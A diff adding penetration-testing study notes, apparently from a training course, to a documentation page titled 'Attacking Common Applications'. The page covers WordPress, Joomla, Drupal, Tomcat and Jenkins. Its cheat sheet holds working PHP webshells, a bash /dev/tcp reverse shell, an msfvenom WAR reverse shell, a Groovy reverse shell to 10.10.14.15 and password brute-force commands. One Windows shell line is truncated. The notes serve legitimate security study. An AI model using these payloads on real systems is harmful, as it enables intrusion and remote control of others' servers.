@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#attacking-common-applications" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -770,6 +775,21 @@
       <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
       
       
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Attacking Common Applications
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
         
@@ -782,6 +802,85 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cheat Sheet
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration Tools
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-note-layout" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example note layout
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#wordpress" class="md-nav__link">
+    <span class="md-ellipsis">
+      Wordpress
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Wordpress">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#manual-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Manual Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wpscan" class="md-nav__link">
+    <span class="md-ellipsis">
+      WPScan
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -935,6 +1034,76 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cheat Sheet
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration Tools
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-note-layout" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example note layout
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#wordpress" class="md-nav__link">
+    <span class="md-ellipsis">
+      Wordpress
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Wordpress">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#manual-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Manual Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wpscan" class="md-nav__link">
+    <span class="md-ellipsis">
+      WPScan
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -950,9 +1119,182 @@
 
 
 
-  <h1>Attacking Common Applications</h1>
-
-
+<h1 id="attacking-common-applications">Attacking Common Applications</h1>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo vim /etc/hosts</code></td>
+<td>Opens /etc/hosts with vim to add hostnames</td>
+</tr>
+<tr>
+<td><code>sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list</code></td>
+<td>Runs nmap scan on common web ports from scope_list, outputs to web_discovery in all formats</td>
+</tr>
+<tr>
+<td><code>eyewitness --web -x web_discovery.xml -d &lt;nameofdirectorytobecreated&gt;</code></td>
+<td>Runs eyewitness on nmap XML output, creates directory</td>
+</tr>
+<tr>
+<td><code>cat web_discovery.xml \| ./aquatone -nmap</code></td>
+<td>Pipes nmap XML to aquatone as nmap input</td>
+</tr>
+<tr>
+<td><code>sudo wpscan --url &lt;http://domainnameoripaddress&gt; --enumerate</code></td>
+<td>Runs wpscan with enumeration on target URL</td>
+</tr>
+<tr>
+<td><code>sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url &lt;http://domainnameoripaddress&gt;</code></td>
+<td>Runs wpscan XMLRPC password attack with rockyou wordlist</td>
+</tr>
+<tr>
+<td><code>curl -s http://&lt;hostnameoripoftargetsite&gt;/path/to/webshell.php?cmd=id</code></td>
+<td>Executes id command via PHP webshell with curl</td>
+</tr>
+<tr>
+<td><code>&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ip address of attack box&gt;/&lt;port of choice&gt; 0&gt;&amp;1'"); ?&gt;</code></td>
+<td>PHP code for Linux reverse shell</td>
+</tr>
+<tr>
+<td><code>droopescan scan joomla --url http://&lt;domainnameoripaddress&gt;</code></td>
+<td>Runs droopescan against Joomla site</td>
+</tr>
+<tr>
+<td><code>sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr &lt;username or path to username list&gt;</code></td>
+<td>Runs joomla-brute.py with specified wordlist and usernames</td>
+</tr>
+<tr>
+<td><code>&lt;?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?&gt;</code></td>
+<td>PHP webshell for Drupal, command via GET parameter</td>
+</tr>
+<tr>
+<td><code>curl -s &lt;http://domainname or IP address of site&gt;/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \| grep uid \| cut -f4 -d"&gt;"</code></td>
+<td>Executes id via Drupal webshell with curl</td>
+</tr>
+<tr>
+<td><code>gobuster dir -u &lt;http://domainnameoripaddressofsite&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code></td>
+<td>Directory brute force with gobuster and wordlist</td>
+</tr>
+<tr>
+<td><code>auxiliary/scanner/http/tomcat_mgr_login</code></td>
+<td>Metasploit module for Tomcat manager brute force</td>
+</tr>
+<tr>
+<td><code>python3 mgr_brute.py -U &lt;http://domainnameoripaddressofTomCatsite&gt; -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt</code></td>
+<td>Runs mgr_brute.py against Tomcat /manager with default creds lists</td>
+</tr>
+<tr>
+<td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip address of attack box&gt; LPORT=&lt;port to listen on to catch a shell&gt; -f war &gt; backup.war</code></td>
+<td>Generates JSP reverse shell WAR payload</td>
+</tr>
+<tr>
+<td><code>nmap -sV -p 8009,8080 &lt;domainname or IP address of tomcat site&gt;</code></td>
+<td>Nmap version scan for Tomcat and AJP ports</td>
+</tr>
+<tr>
+<td><code>r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 \| while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[]) p.waitFor()</code></td>
+<td>Groovy Linux reverse shell for Jenkins Script Console</td>
+</tr>
+<tr>
+<td><code>def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");</code></td>
+<td>Groovy command execution for Windows Jenkins Script Console</td>
+</tr>
+<tr>
+<td><code>String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);</code></td>
+<td>Groovy Windows reverse shell for Jenkins Script Console</td>
+</tr>
+<tr>
+<td><a href="https://github.com/0xjpuff/reverse_shell_splunk"><code>reverse_shell_splunk</code></a></td>
+<td>Splunk package for reverse shells on Windows/Linux</td>
+</tr>
+</tbody>
+</table>
+<h2 id="enumeration-tools">Enumeration Tools</h2>
+<ul>
+<li>
+<p><a href="https://github.com/RedSiege/EyeWitness">Eyewitness</a>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1">sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>eyewitness
+</span><span id="__span-0-2">eyewitness<span class="w"> </span>--web<span class="w"> </span>-x<span class="w"> </span>web_discovery.xml<span class="w"> </span>-d<span class="w"> </span>inlanefreight_eyewitness
+</span></code></pre></div></td></tr></table></div></p>
+</li>
+<li>
+<p><a href="https://github.com/michenriksen/aquatone">Aquatone</a>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1">wget<span class="w"> </span>https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
+</span><span id="__span-1-2">unzip<span class="w"> </span>aquatone_linux_amd64_1.7.0.zip
+</span><span id="__span-1-3"><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span>
+</span></code></pre></div></td></tr></table></div></p>
+</li>
+<li>move to a $PATH location(<code>/usr/local/bin</code>) or current working folder
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1">cat<span class="w"> </span>web_discovery.xml<span class="w"> </span><span class="p">|</span><span class="w"> </span>./aquatone<span class="w"> </span>-nmap
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h2 id="example-note-layout">Example note layout</h2>
+<p>External Penetration Test - <Client Name>
+- Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)
+- Client Points of Contact
+- Credentials
+- Discovery/Enumeration
+    - Scans
+    - Live hosts
+- Application Discovery
+    - Scans
+    - Interesting/Notable Hosts
+- Exploitation
+    - \&lt;Hostname or IP&gt;
+    - \&lt;Hostname or IP&gt;
+- Post-Exploitation
+    - \&lt;Hostname or IP&gt;
+    - \&lt;Hostname or IP&gt;</p>
+<h2 id="wordpress">Wordpress</h2>
+<h3 id="manual-enumeration">Manual Enumeration</h3>
+<ul>
+<li><code>robots.txt</code> - can quickly identify if WordPress used</li>
+<li><code>curl -s http://blog.inlanefreight.local | grep WordPress</code> - another quick identification method</li>
+<li><code>wp-content/plugins</code> - plugins directory</li>
+<li><code>wp-content/themes</code> - themes directory</li>
+<li>WordPress user typses on a standard installation<ol>
+<li>Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.</li>
+<li>Editor: An editor can publish and manage posts, including the posts of other users.</li>
+<li>Author: They can publish and manage their own posts.</li>
+<li>Contributor: These users can write and manage their own posts but cannot publish them.</li>
+<li>Subscriber: These are standard users who can browse posts and edit their profiles.</li>
+</ol>
+</li>
+<li>Manually browse and look at page source</li>
+<li>Grep for wp-content directory, themes and plugin:
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1">curl<span class="w"> </span>-s<span class="w"> </span>http://blog.inlanefreight.local/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>themes
+</span><span id="__span-3-2">curl<span class="w"> </span>-s<span class="w"> </span>http://blog.inlanefreight.local/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>plugins
+</span></code></pre></div></td></tr></table></div></li>
+<li>Enumerate versions of found plugins<ul>
+<li>Check for <code>readme.txt</code> in their directories i.e: <code>http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt</code></li>
+<li>Check for vulnerabilities of found versions</li>
+</ul>
+</li>
+<li>Continue enumaration on other pages i.e: <code>curl -s http://blog.inlanefreight.local/?p=1 | grep plugins</code></li>
+<li>Try some manual enumeration of usernames and/or passwords at the default login page <code>http://blog.inlanefreight.local/wp-login.php</code> (testing for different error messages; correct user wrong password etc)</li>
+</ul>
+<h3 id="wpscan">WPScan</h3>
+<ul>
+<li><a href="https://wpvulndb.com/">WPVulnDB</a> to obtain API token
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1">sudo<span class="w"> </span>gem<span class="w"> </span>install<span class="w"> </span>wpscan
+</span><span id="__span-4-2">wpscan<span class="w"> </span>-h
+</span></code></pre></div></td></tr></table></div></li>
+<li>Default enumeration (plugins, themes, users, media, and backups):
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1">sudo<span class="w"> </span>wpscan<span class="w"> </span>--url<span class="w"> </span>http://blog.inlanefreight.local<span class="w"> </span>--enumerate<span class="w"> </span>--api-token<span class="w"> </span>dEOFB<span class="se">\&lt;</span>SNIP<span class="se">\&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>Default threads used is 5, change with <code>-t</code> flag.</li>
+</ul>
 
 
 
